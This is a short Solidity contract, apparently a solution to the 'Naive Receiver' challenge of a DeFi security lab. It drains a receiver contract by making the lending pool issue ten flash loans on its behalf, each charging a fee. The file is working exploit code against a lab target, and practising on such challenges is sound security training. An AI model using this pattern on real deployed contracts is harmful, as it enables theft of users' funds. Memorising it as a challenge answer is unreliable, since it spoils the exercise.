import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract AttackNaiveReceiver {
    NaiveReceiverLenderPool pool;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function drainReceiver(address receiver) public {
        for (int256 i = 10; i > 0; i--) {
            pool.flashLoan(IERC3156FlashBorrower(receiver), ETH, 1 ether, "");
        }
    }
}
